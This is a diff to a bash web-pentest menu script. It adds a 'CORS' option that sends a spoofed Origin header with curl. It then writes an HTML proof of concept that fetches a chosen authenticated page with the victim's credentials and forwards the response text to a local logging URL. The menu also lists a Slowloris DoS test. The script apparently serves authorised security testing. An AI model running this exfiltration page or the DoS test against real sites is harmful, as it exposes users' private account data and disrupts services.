@@ -33,7 +33,7 @@ else
     bold=$(tput bold)
     echo;echo -e "\033[38;2;255;228;181m>> Target: "$1"\033[m";echo
     PS3=$'\n''-> '
-    options=("Security Headers" "HTTP Headers & Methods" "SSL Scan" "Check WAF" "Clickjacking" "Domain Spoofing" "Zone Transfer" "Wordpress Tests" "Subdomains" "Sitemap Scraping" "Discovery" "TCP Port Scan" "Slowloris DoS Test" "Quit")
+    options=("Security Headers" "HTTP Headers & Methods" "SSL Scan" "Check WAF" "Clickjacking" "CORS" "Domain Spoofing" "Zone Transfer" "Wordpress Tests" "Subdomains" "Sitemap Scraping" "Discovery" "TCP Port Scan" "Slowloris DoS Test" "Quit")
     select opt in "${options[@]}"
     do
         case $opt in
@@ -78,6 +78,23 @@ else
                 echo "file:///tmp/cj-test.html"
                 echo;read -p $'\033[38;2;255;215;0m< Press ENTER to continue >\033[m'
                 rm -rf /tmp/cj-test.html
+                exec $0 $1
+                ;;
+            "CORS")
+                clear;echo;echo -e "\033[38;2;220;20;60m${bold}>>> CORS Arbitrary Origin + Allow Credentials PoC\033[m";echo
+                url=$target
+                echo -e '\033[38;2;0;255;255mcurl '$target' -H "Origin: https://poc-cors.com" -I -s -k -L | egrep "Access-Control-Allow-Origin|Access-Control-Allow-Credentials" | sort -u\033[m';echo
+                curl $target -H "Origin: https://poc-cors.com" -I -s -k -L | egrep "Access-Control-Allow-Origin|Access-Control-Allow-Credentials" | sort -u
+		            echo;echo -e '\033[38;2;255;228;181m-> Insert a URL to test for sensitive information exposure (e.g. https://site.com/accountInfo) - or leave it empty to use '$target'\033[m'
+		            read -p $'\033[38;2;255;228;181m-> URL: \033[m' newurl
+		            if [[ ! -z $newurl  ]]; then url=$newurl; fi
+		            echo;echo -e '\033[38;2;255;228;181m-> If authenticated, with the browser still open, copy the link below and paste into a new tab;\033[m'
+		            echo -e '\033[38;2;255;228;181m-> After the tests, use Ctrl+C to close the python webserver.\033[m'
+		            echo "<html><body><script>var req = new XMLHttpRequest();req.onload = reqListener;req.open('get','"$url"',true);req.withCredentials = true;req.send();function reqListener(){location='/log?valor='+this.responseText;};</script></body></html>" > cors.html
+		            echo;echo -e '\033[38;2;0;255;255m-> Link:\033[m http://localhost:44610/cors.html';echo
+		            python3 -m http.server 44610
+                echo;read -p $'\033[38;2;255;215;0m< Press ENTER to continue >\033[m'
+                rm -rf cors.html
                 exec $0 $1
                 ;;
             "Domain Spoofing")
@@ -143,10 +160,10 @@ else
             "Sitemap Scraping")
                 clear;echo;echo -e "\033[38;2;220;20;60m${bold}>>> Sitemap Scraping\033[m";echo
                 python3 sitemap_scraper.py $target > /tmp/sitemap_temp.txt
-                cat /tmp/sitemap_temp.txt | cut -d "=" -f2 | cut -d "," -f1 | sort -u > sitemap.txt
+                cat /tmp/sitemap_temp.txt | cut -d "=" -f2 | cut -d "," -f1 | sort -u > urls.txt
                 rm -rf /tmp/sitemap_temp.txt
                 clear;echo;echo -e "\033[38;2;220;20;60m${bold}>>> Sitemap Scraping\033[m";echo
-                echo "URLs saved to file "$(/bin/pwd)"/sitemap.txt"
+                echo "URLs saved to file "$(/bin/pwd)"/urls.txt"
                 echo;read -p $'\033[38;2;255;215;0m< Press ENTER to continue >\033[m'; exec $0 $1
                 ;;
             "Discovery")
